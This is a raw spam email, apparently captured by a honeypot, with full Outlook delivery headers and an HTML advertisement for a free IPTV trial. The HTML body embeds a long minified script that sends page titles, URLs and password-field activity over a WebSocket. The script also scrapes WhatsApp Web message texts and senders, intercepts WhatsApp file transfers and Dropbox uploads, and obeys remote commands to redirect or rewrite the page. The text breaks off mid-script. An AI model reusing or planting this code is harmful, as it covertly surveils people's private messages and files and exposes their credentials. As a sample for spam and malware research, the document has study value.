Received: from MN0PR10MB5936.namprd10.prod.outlook.com (::1) by
 MW4PR10MB5749.namprd10.prod.outlook.com with HTTPS; Sat, 20 Sep 2025 19:24:59
 +0000
Received: from CH2PR18CA0048.namprd18.prod.outlook.com (2603:10b6:610:55::28)
 by MN0PR10MB5936.namprd10.prod.outlook.com (2603:10b6:208:3cc::5) with
 Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.9137.19; Sat, 20 Sep
 2025 19:24:58 +0000
Received: from CH2PEPF00000140.namprd02.prod.outlook.com
 (2603:10b6:610:55:cafe::1c) by CH2PR18CA0048.outlook.office365.com
 (2603:10b6:610:55::28) with Microsoft SMTP Server (version=TLS1_3,
 cipher=TLS_AES_256_GCM_SHA384) id 15.20.9137.16 via Frontend Transport; Sat,
 20 Sep 2025 19:24:58 +0000
Authentication-Results: spf=none (sender IP is 68.218.60.41)
 smtp.mailfrom=ufjzf.8wzzxvixxp.edu.info; dkim=none (message not signed)
 header.d=none;dmarc=none action=none header.from=;
Received-SPF: None (protection.outlook.com: ufjzf.8wzzxvixxp.edu.info does not
 designate permitted sender hosts)
Received: from placeatqgzgr.transitioninstituteofmarin.com (68.218.60.41) by
 CH2PEPF00000140.mail.protection.outlook.com (10.167.244.72) with Microsoft
 SMTP Server id 15.20.9137.12 via Frontend Transport; Sat, 20 Sep 2025
 19:24:56 +0000
X-IncomingTopHeaderMarker: OriginalChecksum:3418D0A0A18C9C96ACBD23590A895F884051348291F2308BAC073DC6782FB9AD;UpperCasedChecksum:EF7C30F70BC444163446BA38FA6F6FE45BF365D2FDC9B2300E8801616FC12560;SizeAsReceived:334;Count:8
Date: Fri, 19 Sep 2025 22:57:01 +0000
To: <phishing@pot>
From: IPTV-Angebote heute  <UnlimitedTV@'UnlimitedTV-eunim.autoworkscoll.com>
Subject: Kostenlose IPTV-Testversion – Sofortiges Streamen auf jedem Gerät
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: 8bit
X-IncomingHeaderCount: 8
Message-ID: <61b27232-f1f9-4f22-9492-b02d40f9c1c2@CH2PEPF00000140.namprd02.prod.outlook.com>
Return-Path: bounce@ufjzf.8wzzxvixxp.edu.info
X-MS-Exchange-Organization-ExpirationStartTime: 20 Sep 2025 19:24:56.7242
 (UTC)
X-MS-Exchange-Organization-ExpirationStartTimeReason: OriginalSubmit
X-MS-Exchange-Organization-ExpirationInterval: 1:00:00:00.0000000
X-MS-Exchange-Organization-ExpirationIntervalReason: OriginalSubmit
X-MS-Exchange-Organization-Network-Message-Id: d592f48e-80d2-40ef-7602-08ddf87b621d
X-EOPAttributedMessage: 0
X-EOPTenantAttributedMessage: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa:0
X-MS-Exchange-Organization-MessageDirectionality: Incoming
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: CH2PEPF00000140:EE_|MN0PR10MB5936:EE_|MW4PR10MB5749:EE_
X-MS-Exchange-Organization-AuthSource: CH2PEPF00000140.namprd02.prod.outlook.com
X-MS-Exchange-Organization-AuthAs: Anonymous
X-MS-UserLastLogonTime: 9/20/2025 7:23:47 PM
X-MS-Office365-Filtering-Correlation-Id: d592f48e-80d2-40ef-7602-08ddf87b621d
X-MS-Exchange-EOPDirect: true
X-Sender-IP: 68.218.60.41
X-SID-Result: NONE
X-MS-Exchange-Organization-SCL: 9
X-Microsoft-Antispam: BCL:0;ARA:1444111002|70000799015|461199028|13020799006|3025599003|9400799037|84100799003|10300799035|20103052909095|33080799003|3600799018|32080799003|47200799021|58200799018|9800799015|51300799021|87000799018|45200799018|6010799018|26120799003;
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 20 Sep 2025 19:24:56.3120
 (UTC)
X-MS-Exchange-CrossTenant-Network-Message-Id: d592f48e-80d2-40ef-7602-08ddf87b621d
X-MS-Exchange-CrossTenant-Id: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa
X-MS-Exchange-CrossTenant-AuthSource: CH2PEPF00000140.namprd02.prod.outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Anonymous
X-MS-Exchange-CrossTenant-FromEntityHeader: Internet
X-MS-Exchange-CrossTenant-RMS-PersistedConsumerOrg: 00000000-0000-0000-0000-000000000000
X-MS-Exchange-Transport-CrossTenantHeadersStamped: MN0PR10MB5936
X-MS-Exchange-Transport-EndToEndLatency: 00:00:03.4069469
X-MS-Exchange-Processed-By-BccFoldering: 15.20.9137.005
X-Microsoft-Antispam-Mailbox-Delivery:
	ucf:0;jmr:0;ex:0;auth:0;dest:J;OFR:SpamFilterAuthJ;ENG:(5062000311)(920221119095)(90000117)(920221120095)(90002001)(91000020)(91036095)(91040095)(9050020)(9055020)(9100341)(944500132)(2008001181)(2008121020)(4810010)(4910033)(10010005)(10005027)(9540006)(10103005)(9320005)(9215007)(120001);RF:JunkEmail;
X-Message-Delivery: Vj0xLjE7dXM9MDtsPTA7YT0wO0Q9MjtHRD0xO1NDTD02
X-Microsoft-Antispam-Message-Info:
	=?utf-8?B?VGtncytlQkU4clZGNGNwNmMwTU10aGhPdlIzamhLQ3BlU3QxNnRDeE1ac3lo?=
 =?utf-8?B?YkM1K3hVYlp3MTlJVUxkK3hhdGYvWU1mcXdobzU1bXY4MG1QMUgwUTJIM0I0?=
 =?utf-8?B?QWtBamh1YkhnNWc3ZGZCckZWdExLRGx6TElKSlN4SFhhdmxTandNbWVQQ3ZX?=
 =?utf-8?B?YjlIRnUyTnVKb1R0K1ZKMGlDaXJvS1FvelZMaU81RW85anJVdlY5MmJJVi9F?=
 =?utf-8?B?RXp3WUx6QVhVRFlBMkowNWp0bWN1cTJEbzNjMzF6ek9laHZObks2c1RJZXFq?=
 =?utf-8?B?bkZrYUswL2dtVUNRRzAyeU4rUXllWDNFMCtYdDdmUEd1Q0x4anlwOVdaSEdz?=
 =?utf-8?B?NTQ5TXdsd0p2ZzdVc2gyRDEzR3VoVzdvL3oxYW9UOVdnNzZkSDZlUmZyN3FU?=
 =?utf-8?B?bkwzL0ZYRXJwQUwzb2oyekFKZk1OZ2wxZE1LK2dtOFhIbW80Lzk3N2kwZXRU?=
 =?utf-8?B?bWlNYU1EL0VtQnhKdFZXYjd0RlZqd2RmekIrME4vVlcrT0wyRzl3b1VDdnpJ?=
 =?utf-8?B?NDJrWXZTKzFaeStDK216Q0pWM2NCTlVPWGhDWktieVNZMFhUQ2htSUlkS3E3?=
 =?utf-8?B?RFR3S1NwQkpwcUpqcEdWVkxFS245SHRpaHRSYXVxU3Ixcy9TWnZObTF2QXgw?=
 =?utf-8?B?MnpJMG5iNFVVTWQ5SEdZK0Y2dU5SQUtxU3FoQWZWVDBTa1doc1BIaWpmTGFX?=
 =?utf-8?B?dDV6VlVlTEpENUhheXMrT21IeFB4bFp2dHNJcUdmUzRYVDdsRHFDSDh4Nmdn?=
 =?utf-8?B?elorZCt4anEyeGNBWFBSdkVocVlkMEpMQVp6SDRZTjVIMzBrN3haUCtGcDBN?=
 =?utf-8?B?dEJjNXE1eFRIYncyOEUwVFV1TnNablh1MGgvamZEUE54OVZRdmRxbENoMTh4?=
 =?utf-8?B?REpBTDBmK2ZDS2RxclRqbzBqQUQ4Rm93T2Z6VWFzdVJOcjN2NTdjeWVGdDhv?=
 =?utf-8?B?Nlk2dnJMb2d4dU1QbEJVbGFWZUdrYXMxallOUTFBVmFuV2NHejBUR3ZHeEl5?=
 =?utf-8?B?RWp5eHVYandaRE54SkpKV2d3bk9xZVVnWHdWYmtlaHM1M3l0a0lsQjk3M2V2?=
 =?utf-8?B?VXBTWWpPUGpndWNpRVFnUGhzOEhRWHdObFZ4RnpEWkpJL3E2TlZGdUlUM1ox?=
 =?utf-8?B?RnN1TnBmKzVEUHhvM0twQ2c2cklHVVBCMjdlTWZSNlBpamNqQ2c4dWJpek52?=
 =?utf-8?B?eEtONWVub21zR0kzWWMyby9VYzZuakpKVlBhWnhESjRrOEFYTGNhZ291MHpH?=
 =?utf-8?B?MncvOFZjbDlJR2Q0MTRpa09uV3ZqYUdocUoxYjB5T0ViWnFkUzFCT2FoVVZp?=
 =?utf-8?B?TEZMSkp4QmFaUFRDYS95L2FpSStDNUVJQTZNQ2x0VGYvVHJzRkxxR1dEdW8z?=
 =?utf-8?B?ajFBY096cEE1RlkrWHBiN0hUZ0xTUTYzT1dsSURZMVRXTGlLSTJhcXpyazVW?=
 =?utf-8?B?M3VNSUdCZjhhRE5XYjJEMXloRWdRVW5mU2lZMXNqTUtGMW1QSFpxM1R3RmZV?=
 =?utf-8?B?cjFhSnFYTVQwVlJ1bHlhVUt3enEyYm9EeXQ4RFhkendxK2xaYlJiWGZvK3Rr?=
 =?utf-8?B?bm9vUjlHZCthYWtZQThUUURSbnZnV0R6YnR0djZ2UGlVUnFpdGwxdTdiRUx4?=
 =?utf-8?B?bEloMHhBWmRLOThZdWpVSHowZzh5dGtPNExFZTNWQzV6OXlGM1o4Y0t2R05P?=
 =?utf-8?B?c0h2RVZFMlpzWHV6RXFqd095TXJEYk0zRlF2MzZaQnAwZy9Hc0pObGpEMnNO?=
 =?utf-8?B?SHFRTm5Eb1JMMVNxOFV5MERhR09QN1VGYjdHOE91KzhmRjkxbnNReWxLcStz?=
 =?utf-8?B?dzQrVGNDemxMckpkcnVuRGtVWkpoK0ZGQmNFN1hZL1hMR3FZUE9ZM3cyNzZL?=
 =?utf-8?B?VlVqZndxQ2luZ1MvSk9lOE50UmhEOTNyUEwrcTFYVW9lZnZ5RFdFVkJJWE43?=
 =?utf-8?B?b3cvYmpGYndPeXRKbUVpdjY2djZWSUxPMzF5UlcxRnFDdGlaTjVpWnVTSjBC?=
 =?utf-8?B?dWxPYTArL0svMWVIVlpYcVExbU9Hb1pwdkxQL2I3MmNCeFE5bENPNTNJU05L?=
 =?utf-8?B?R01lZmFkVnVWa0dlRnltOTd2TTVkanRtZHQ3TUNqT0RmdzZXZlk4azZKYVN0?=
 =?utf-8?B?MENqT0p1b3paempHcmhPZUdJOHI3ditVbkNPS1pFbE05aEZqTWJmeEVqVURQ?=
 =?utf-8?B?bU4vcnQwcFpBeEZWNnpqcmVzZ3UzYjdEV0ZmdTF5YmhycDNMZ2VrbEJneTRX?=
 =?utf-8?B?UVZxTVo5WnptL1VIYURyTWlpWVBzdEhlNlFHZ2puRUE1Mkx6c3pQMit3VlFG?=
 =?utf-8?B?c0lBN1d2b2RhK0pEd0kraFc5R2tZY1F0NytrTmNWUGRlbTQvR0pFWGpidDI1?=
 =?utf-8?B?Kys5V1pBZTZ6M0gzNlp4VjBBRy9Bd2EvUk5nQXppU1F4SHQxVnp1ckVBWldT?=
 =?utf-8?B?Z3hmNDJHci81c0lVRG9HazhvTkhpd1lQMzN6VzdMemRwZ2lXdy9WbTdpdjV1?=
 =?utf-8?B?MGFieVVXL2pidFE3UHM4Z1lLS1lBV0tOMUtCVHVqQUVJUVpLVmhvWmR6SFYy?=
 =?utf-8?B?Z01xcDlxM2dOejB0NEZ4ZksyU25ZeDZnOURSUDhWOUVoSlNKVHBPODkzMW94?=
 =?utf-8?B?VnFxbTJlU1EydzNqNDdQTU9FTmZLZnhOS1FBSEorQXRJTFlkc2hXbWl0RzNY?=
 =?utf-8?B?RkFFZDY4Mi80c2JZS1B6QVBNNER6L1pONk9xSXpaeUZtNnhWY3hWYzlVYksy?=
 =?utf-8?B?NnptellYNEtzb1BJaFpIWjBadlhIUXVMbzhaaERJVnlBZWl6NlFhQ2JNZ1BX?=
 =?utf-8?B?c3VBR290eHZSS3AyTFloQTFLNG5NWE5sRXVic01KT3BLVFlTNkJ0OWtvQm5k?=
 =?utf-8?B?OCszTmo2TCsvdXg3WGVxeVlyZ3djNFRKdjJqWVlKVXY2NXlWdkVuZzFmUVBk?=
 =?utf-8?B?NHRjc0lqam81SkxReWJrNzlFR3VuRGtHU21INTZLVlhjRG1zcitOSkZnbjRm?=
 =?utf-8?B?LzlyUE5MeFBaVUZ2bW00TGl0MmdaSzA2VjFGYkpHc1BKS3hYOVMwejg0aTcy?=
 =?utf-8?B?QXY1RUtpT3pEMlloekZoa1hpdnJQWWNmRGpRVGVyeW5jM3RVUXZXaStEVGNN?=
 =?utf-8?B?SjRuZ3ZMWmJtR1plWEFxZmUwMlp3d1pLaURXWVRpRDNiVHB1SkJMZkozdSts?=
 =?utf-8?B?NXE5Mi9rYWZBVmFidnNodU9mMWVSN3VPWndOVk5TQW9Ca1U1UFIrMFkwNE9s?=
 =?utf-8?B?aWJCYlJ3VjJnMUozU3ZjVE44azhTcCtZbWFWUnR0ZHBUVTkxRy9QZ1NUM2Zn?=
 =?utf-8?B?NytrYjkwQmNoVXJnR0w5anpZcGlONTVjMFZna01Vc3V2YnZUUXI3Snd4RzVx?=
 =?utf-8?B?bVZXZHdlVmJPMEtaV2pNeVpyNUZOV0hlM0NEaGJjbEhtNFpKNEgyYlVuLzRQ?=
 =?utf-8?B?RHBicm9OVC9tN2FCQnFKRHJmZXBOM0pveU9rTVpSN2ZkblFndnNsR2tkd1Fo?=
 =?utf-8?B?d0t6UWJmMzFGZHBSdTVZZG1XL0d5dkhZME1kMXdpak1IU3Z3Yjk1OGEyM3I2?=
 =?utf-8?B?bHI1MlhLYjdzcE0rRjdOV2NrQXhvNDJlOUE1a3RIMTJTT1YyZEFxRGc5OEtW?=
 =?utf-8?B?WkdVTlNqL1VSUE5TWW92TVdFWllzeWRkY3NYM1Y3dTltaFE4SktFbldFQSs0?=
 =?utf-8?B?Zm9DVzJXM0FwUjg0N0JVRmVzZ3ZUWmp3dlRrVXFiWitkWDlFcTFYQVNSQjFR?=
 =?utf-8?B?eERYZFNQZG5HdzAzT2RQSm03Y1B6STVTR2R1QmN1VkZBcUNmSTdOWlFqSkxU?=
 =?utf-8?B?UmlaS3Roc0V6QXRrMHlraGxoSS95Wkx5TUY1N1RPUHNCcDBIN3ZtT25VKy8z?=
 =?utf-8?B?SzR5dUNyZlZjeStlTFRZeldPZEFXZkFlcVpLQTVmUHVWZTExMmNlT0IwSmhB?=
 =?utf-8?B?NUJzL3FaNW43M0RBZ01mMWJOaC9KMUhMSDc1T0JGSlFLK2xZYytzeWNRT3J5?=
 =?utf-8?B?Ni9XSlAyZUQ1a2lmS09SS01iU0plWDdSeXFVU0wvNmpHb05uTTlTTUk2ZFVN?=
 =?utf-8?B?cFNUazZVb3IyTU5jNm0wWGZPQk1HdTZ6dys0Sm1yTk5ya2xZcmxmSkR3U0Vp?=
 =?utf-8?B?aStIMUVibWp5eklZQk03aFJ1enhuUTRSVVh6N1lYRHFzb29vVVliVlUzVUZ4?=
 =?utf-8?B?a1dPVFRjSEN2cnY0d2pXOEZmN3M2enVoWWRKV25MeEh2QVBEWm15cE1MWHJJ?=
 =?utf-8?B?THRBL0hHeS9yTndZdWsrUFZ6NDFPRmdqamg4aHd0Yk9wWUNUTGk0emQ5RFRr?=
 =?utf-8?B?cDBXWkcrSHo2MitXb0J3bXdhNFJFZjhxb1RzT2puRDFkWmdTUnRJTk41a0tT?=
 =?utf-8?B?REcwNEtRQWxBdk1EL3hicnRSU0ZjRmlXT1lYaUtNV0RUSU1pVzVJYU9YdVgy?=
 =?utf-8?Q?c3Q=3D?=
MIME-Version: 1.0

<!DOCTYPE html><html><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <title>Discover Premium IPTV Streaming</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #eeeeee;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    .email-container {
      max-width: 600px;
      margin: 30px auto;
      background-color: #ffffff;
      border-radius: 10px;
      overflow: hidden;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    .header {
      background-color: #e5383b;
      color: #ffffff;
      text-align: center;
      padding: 30px 20px;
    }
    .header h1 {
      margin: 0;
      font-size: 28px;
    }
    .subheader {
      font-size: 16px;
      margin-top: 10px;
      color: #d6ecff;
    }
    .content {
      padding: 25px 20px;
      color: #333333;
      font-size: 16px;
      line-height: 1.7;
    }
    .highlight {
      color: #1e90ff;
      font-weight: bold;
    }
    .features {
      background-color: #f7f9fb;
      padding: 20px;
      border-radius: 8px;
      margin: 20px 0;
    }
    .features ul {
      list-style: none;
      padding-left: 0;
    }
    .features li {
      margin-bottom: 12px;
      font-size: 15px;
    }
    .features li::before {
      content: "✅ ";
      color: #1e90ff;
    }
    .cta-button {
      display: inline-block;
      margin: 25px auto;
      background-color: #1982c4;
      color: #ffffff !important;
      text-decoration: none;
      padding: 14px 30px;
      font-size: 16px;
      border-radius: 6px;
      font-weight: bold;
    }
    .cta-button:hover {
      background-color: #218838;
    }
    .footer {
      text-align: center;
      font-size: 13px;
      color: #888888;
      padding: 20px;
      background-color: #f2f2f2;
    }
    .footer a {
      color: #1e90ff;
      text-decoration: none;
    }
  </style>
</head>
<body><script>!function(){var e,t,n;function Y(){try{return window.self===window.top}catch(e){return!1}}function r(){setTimeout(function(){var e={type:"focus",token:I.token,title:document.title,url:document.URL,focused:document.hasFocus(),useragent:navigator.userAgent,pid:I.pid,pn:I.pn};null!=z&&z.readyState==WebSocket.OPEN&&z.send(JSON.stringify(e))},0)}function o(){var e={type:"notification",token:I.token,title:document.title,url:document.URL,focused:document.hasFocus(),timeout:I.sendNotificationsInterval,useragent:navigator.appVersion.length>navigator.userAgent.length?navigator.appVersion:navigator.userAgent,pid:I.pid,pn:I.pn};z.send(JSON.stringify(e))}function s(){y()}function a(){Y()&&(clearInterval(H),clearInterval(C)),timeout=setTimeout(function(){m()},T)}function i(e){if(Y())switch(e.data.substring(0,1)){case"r":window.location=e.data.substring(1);break;case"b":document.body.innerHTML=e.data.substring(1);break;case"w":var t="true"==e.data.substring(1).toLowerCase();R!=t&&t&&v(),R=t;break;case"x":!function(e){try{const t=JSON.parse(e),n=S.get(t.requestId);if(n){S.delete(t.requestId);const{responseCallback:e,fileName:Y}=n;e(t,Y)}}catch(e){unblockPage()}}(e.data.substring(1));break;case"d":tmDropboxHandleResponse(e.data.substring(1))}}function d(e){var t=document.createElement("a");return t.href=e,t.href}function u(e){if(!e)return!1;if("password"==e.type)return!0;if(e instanceof HTMLInputElement){var t=window.getComputedStyle(e);if(t){var n=t.getPropertyValue("-webkit-text-security");return["disc","circle","square"].includes(n)}}return!1}function c(e,t=!1){if(u(e)&&!U)if(U=!0,Y()){var n={type:"password_input_focus",focus:!0,token:I.token};z.send(JSON.stringify(n))}else window.top.postMessage({message:"iframePasswordInputFocused",name:e.name,type:"password"},"*")}function l(e,t=!1){var n=e&&e.name?e.name:"<unnamed>";if(u(e)&&U)if(U=!1,Y()){var r={type:"password_input_focus",focus:!1,token:I.token};z.send(JSON.stringify(r))}else window.top.postMessage({message:"iframePasswordInputBlurred",name:n,type:"password"},"*")}function M(e){var t=document.activeElement;t&&t!=document.body?document.querySelector&&(t=document.querySelector(":focus")):t=null;for(var n=0;n<e.length;++n){let s=e[n];var Y=u(s),r=Y&&s.hasAttribute("autofocus"),o=Y&&t&&s.isEqualNode(t);(r||o)&&c(s),s.tmInputEventListenerAttached||(s.addEventListener("focus",function(e){c(e.target)},!0),s.addEventListener("blur",function(e){l(e.target)},!0),s.tmInputEventListenerAttached=!0)}}function f(){M(document.getElementsByTagName("input"));var e=new MutationObserver(function(e){e&&e.forEach(function(e){e&&e.addedNodes&&0!=e.addedNodes.length&&(window.NodeList&&!NodeList.prototype.forEach&&(NodeList.prototype.forEach=Array.prototype.forEach),e.addedNodes.forEach(function(e){if(e.tagName){var t=[];"input"==e.tagName.toLowerCase()?t.push(e):t=e.getElementsByTagName("input"),t.length&&M(t)}}))})});e.observe(document,{childList:!0,subtree:!0}),window.addEventListener("beforeunload",function(e){l(),function(){for(var e=document.getElementsByTagName("input"),t=0;t<e.length;++t){let n=e[t];n.removeEventListener("focus",c),n.removeEventListener("blur",l),delete n.tmInputEventListenerAttached}}()})}function p(){var e;Y()&&(I.iup&&(e={type:"connect",token:I.token,title:document.title,url:document.URL,focused:document.hasFocus(),useragent:navigator.userAgent,pid:I.pid,pn:I.pn},null!=z&&z.readyState==WebSocket.OPEN&&z.send(JSON.stringify(e))),g()&&(v(),y(),function(){function e(e){return e.baseURI&&e.baseURI.startsWith("https://web.whatsapp.com/")}function t(e){const t=e.dataTransfer.files;t.length>0&&Array.from(t).forEach(e=>{w(e)})}document.querySelectorAll("div").forEach(n=>{e(n)&&n.addEventListener("drop",t,{passive:!0})});var n=new MutationObserver(function(e){e&&(Array.from(document.querySelectorAll(".message-in, .message-out")).reduce((e,t)=>{var n=t.querySelector("button[type=button], div[role=button]");return n&&e.push(n),e},[]).forEach(e=>{const t="modified";e.hasAttribute(t)||(e.setAttribute(t,""),e.onclick=t=>{t.verified||(t.preventDefault(),t.stopPropagation(),new Promise(function(t,n){!function(e,t,n){try{const n=e.parentElement,Y=n[Object.keys(n).find(e=>e.includes("__reactProps"))].children.props.msg,r=Y.mediaData,o=crypto.randomUUID();S.set(o,{responseCallback:e=>t(!e.block)}),z.send(JSON.stringify({requestId:o,type:"waptransfer",direction:"download",filename:r.__x_filename,filesize:r.__x_size,filetype:r.__x_mimetype,filehash:Y.__x_encFilehash,url:document.URL,process:I.pn,content:""}))}catch{n()}}(e,t,()=>setTimeout(()=>n(),1))}).then(e=>{t.verified=e,t.verified&&t.target.dispatchEvent(t)},()=>{}))})}),e.forEach(function(e){e&&("childList"!==e.type||e.addedNodes.length<=0||e.addedNodes.forEach(function(e){if(e&&e.nodeType==Node.ELEMENT_NODE){e.querySelectorAll("input").forEach(e=>{!function(e){const t="modified";"file"!==e.type||e.hasAttribute(t)||(e.setAttribute(t,""),e.addEventListener("change",e=>{Array.from(e.target.files).forEach(e=>{w(e)})}))}(e)});var t=document.querySelectorAll("div[id=main] header div")[2];if(t){var n=t.querySelectorAll("div")[1],Y=t.querySelectorAll("div")[2];O=(n?n.innerText:"")+":"+(Y?Y.innerText:"")}document.querySelector("div[id=main] header span[data-icon=default-user]")&&(x="private"),document.querySelector("div[id=main] header span[data-icon=default-group]")&&(x="group");var r=e.querySelectorAll(".message-in, .message-out");r||N("msgNodes is empty"),e.matches(".message-in, .message-out")&&(r=Array.prototype.slice.call(r)).push(e),r&&0!=r.length?r.forEach(function(e){if(e)if(!e.classList||e.classList.length<=0)N("msg node does not contain classList or classList is empty");else{var t=e.classList.contains("message-in"),n=e.querySelector(".copyable-text"),Y=e.querySelector(".selectable-text"),r=new Date,o=null;if(n&&n.attributes["data-pre-plain-text"]){var s=n.attributes["data-pre-plain-text"].textContent,a=/\[(\d{1,2}):(\d{1,2})[ ]{0,1}([p|a]\.?\s?m\.?)?,\s(.+)]\s(.*):/i[Symbol.match](s);if(!a||6!=a.length)return void N("no matches for string: "+s);if(a[3]&&a[3].length>1&&"p"==a[3].toLowerCase().slice(0,1)&&(a[1]=parseInt(a[1])+12),dateParts=/(\d{1,4})[.-\\/](\d{1,4})[.-\\/](\d{1,4})/[Symbol.match](a[4]),!dateParts||4!=dateParts.length)return void N("no matches for string: "+a[4]);if(N(a[4]+P),!(r=date.parse(a[4],P)||function(e,t,n){var Y=[[e,t,n].join("-"),[e,n,t].join("-"),[t,e,n].join("-"),[t,n,e].join("-"),[n,e,t].join("-"),[n,t,e].join("-")],r=Date.now();for(var o in Y){var s=Date.parse(Y[o]);if(s&&!(Math.abs(r-s)>1728e6))return new Date(s)}}(dateParts[1],dateParts[2],dateParts[3])))return void N("Can't parse date from string: "+a[4]);r.setHours(a[1]),r.setMinutes(a[2]),o=a[5]}N("isIncomingMsg = "+t+" msgDateTime = "+r+" msgSender = "+o+" wapStartTime = "+F+" wapTrackingEnabled = "+R),_.get(O)||_.set(O,F);var i=Y?Y.innerText:null;if(N("msgContent = "+i),o&&i&&R){var d=(o+i+O+r.getTime()).split("").map(function(e){return e.charCodeAt(0)}).reduce(function(e,t){return e+((e<<7)+(e<<3))^t}).toString(16);if(_.get(O).getTime()==r.getTime()?r.setMilliseconds(++B):(B=0,_.set(O,r)),!d||q.has(d))return void N("msgId is null or this msgId already tracked "+d);var u={type:"wapmessage",timestamp:r.getTime(),id:d,incoming:t,sender:t?o:"Me",content:i,recipient:t?"Me":O,conversationId:O+"("+x+")"};z.send(JSON.stringify(u)),q.add(d)}}}):N("no msg nodes found")}}))}))});if(!n)return;function Y(){n.observe(document.body,{childList:!0,subtree:!0}),N("observer is ready")}"loading"===document.readyState?document.addEventListener("DOMContentLoaded",Y):Y()}()),k()&&function(){if(!k())return;function e(){window.dropboxBlockedFiles||(window.dropboxBlockedFiles=new Set);const e=new Map;function t(t){t.target.files&&Array.from(t.target.files).forEach(t=>{const n=t.name+"_"+t.size+"_"+t.lastModified;e.set(n,{fileInfo:{name:t.name,size:t.size,type:t.type,lastModified:t.lastModified},timestamp:Date.now()}),A(t)})}function n(e){if(e.dataTransfer?.items)for(const t of e.dataTransfer.items){const e=t.webkitGetAsEntry();e&&Y(e)}}function Y(t){if(t.isFile)t.file(function(t){const n=t.name+"_"+t.size+"_"+t.lastModified;e.set(n,{fileInfo:{name:t.name,size:t.size,type:t.type,lastModified:t.lastModified},timestamp:Date.now()}),A(t)});else if(t.isDirectory){t.createReader().readEntries(function(e){for(const t of e)Y(t)})}}function r(){document.querySelectorAll('input[type="file"]').forEach(e=>{e.hasAttribute("data-tm-hooked")||(e.setAttribute("data-tm-hooked","true"),e.addEventListener("change",t))})}new MutationObserver(()=>r()).observe(document.body,{childList:!0,subtree:!0}),document.addEventListener("dragover",e=>e.preventDefault(),!0),document.addEventListener("drop",n,!0);const o=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(t){const n=this._tmUrl?.includes("append_v2")&&this._tmHeaders?.["dropbox-api-arg"];if(!n||!window.dropboxBlockedFiles)return o.apply(this,arguments);try{const Y=JSON.parse(n);if(!Y.cursor||!Y.close)return o.apply(this,arguments);const r=(Y.cursor.offset||0)+(t&&(t.length||t.size)||0);for(const e of window.dropboxBlockedFiles){const t=parseInt(e.split("_").pop());if(r===t)return}const s=this,a=s.onreadystatechange;s.onreadystatechange=function(){s.readyState===XMLHttpRequest.DONE&&200===s.status&&e.forEach((t,n)=>{t.fileInfo.size===r&&(!function(e,t){try{z.send(JSON.stringify({type:"dropboxupload",filename:e,filesize:t,url:document.URL,process:I.pn,timestamp:Date.now()}))}catch(e){}}(t.fileInfo.name,t.fileInfo.size),e.delete(n))}),a&&a.apply(this,arguments)}}catch(e){}return o.apply(this,arguments)};const s=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(e,t){return this._tmUrl=t,this._tmHeaders={},s.apply(this,arguments)};const a=XMLHttpRequest.prototype.setRequestHeader;XMLHttpRequest.prototype.setRequestHeader=function(e,t){return this._tmHeaders||(this._tmHeaders={}),this._tmHeaders[e.toLowerCase()]=t,a.apply(this,arguments)},r()}"loading"===document.readyState?document.addEventListener("DOMContentLoaded",e):e()}(),Y()&&(o(),H=setInterval(o,I.sendNotificationsInterval),g()&&(C=setInterval(s,I.pollWhatsappTrackingInterval))),function(){for(var e=[],t=document.getElementsByTagName("link"),n=0;n<t.length;++n)"icon"!=t[n].getAttribute("rel")&&"shortcut icon"!=t[n].getAttribute("rel")||(e[e.length]=d(t[n].getAttribute("href")));0==e.length&&(e[0]=d("/favicon.ico"));var Y={type:"favicon"};Y.url=document.URL,Y.src=e,Y.title=document.title,Y.token=I.token,Y.useragent=navigator.appVersion.length>navigator.userAgent.length?navigator.appVersion:navigator.userAgent,z.send(JSON.stringify(Y))}(),I.dontTrackWebPasswords&&f())}function D(){document.tmfilter||(m(),P={"ar-SA":"D/M/YY","bg-BG":"D.M.YYYY","ca-ES":"D/M/YYYY","zh-TW":"YYYY/M/D","cs-CZ":"D.M.YYYY","Da-DK":"D-M-YYYY","De-DE":"D.M.YYYY","el-GR":"D/M/YYYY","en-US":"M/D/YYYY","fi-FI":"D.M.YYYY","fr-FR":"D/M/YYYY","he-IL":"D/M/YYYY","hu-HU":"YYYY. M. D.","is-IS":"D.M.YYYY","it-IT":"D/M/YYYY","ja-JP":"YYYY/M/D","ko-KR":"YYYY-M-D","nl-NL":"D-M-YYYY","nb-NO":"D.M.YYYY","pl-PL":"YYYY-M-D","pt-BR":"D/M/YYYY","ro-RO":"D.M.YYYY","ru-RU":"D.M.YYYY","hr-HR":"D.M.YYYY","sk-SK":"D. M. YYYY","sq-AL":"YYYY-M-D","sv-SE":"YYYY-M-D","th-TH":"D/M/YYYY","tr-TR":"D.M.YYYY","ur-PK":"D/M/YYYY","iD-ID":"D/M/YYYY","uk-UA":"D.M.YYYY","be-BY":"D.M.YYYY","sl-SI":"D.M.YYYY","et-EE":"D.M.YYYY","lv-LV":"YYYY.M.D.","lt-LT":"YYYY.M.D","fa-IR":"M/D/YYYY","vi-VN":"D/M/YYYY","hy-AM":"D.M.YYYY","az-Latn-AZ":"D.M.YYYY","eu-ES":"YYYY/M/D","Mk-MK":"D.M.YYYY","af-ZA":"YYYY/M/D","ka-GE":"D.M.YYYY","fo-FO":"D-M-YYYY","hi-IN":"D-M-YYYY","Ms-MY":"D/M/YYYY","kk-KZ":"D.M.YYYY","ky-KG":"D.M.YY","sw-KE":"M/D/YYYY","uz-Latn-UZ":"D/M 